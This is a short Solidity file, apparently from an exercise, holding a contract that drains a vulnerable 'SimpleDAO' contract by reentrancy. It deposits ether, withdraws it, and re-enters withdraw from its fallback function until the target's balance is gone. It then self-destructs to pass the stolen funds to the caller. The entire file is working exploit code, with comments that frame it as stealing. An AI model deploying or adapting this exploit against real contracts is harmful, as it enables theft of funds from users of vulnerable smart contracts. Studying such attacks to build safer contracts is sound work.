// SPDX-License-Identifier: MIT

pragma solidity ^0.5.0;

interface SimpleDAOInterface {
    function deposit() external payable;
    function withdraw(uint amount) external;
}

contract HackSimpleDAO {
    address simpleDAOAddr;

    constructor() public payable {}
    
    function hack(address addr) public payable {
        simpleDAOAddr = addr;
        SimpleDAOInterface sd = SimpleDAOInterface(simpleDAOAddr);
        
        
        // deposite into the DAO contract
        sd.deposit.value(1 ether)();
        
        // withdraw from this contract to EOA
        sd.withdraw(1 ether);
        
        // send all ether to the EOA and destruct
        selfdestruct(msg.sender);
    }



    // the hacks happens here
    // receive () external payable {  // 0.8.7
    function () external payable {
        // get DAO contract balance
        uint256 balance = simpleDAOAddr.balance;
        
        // return if nothing to steal
        if (balance == 0) return;
        
        // if have ether, only steal 1 ether
        if (balance > 1 ether) balance = 1 ether;
        
        // withdraw from the contract
        SimpleDAOInterface sd = SimpleDAOInterface(simpleDAOAddr);
        sd.withdraw(balance);
    }
}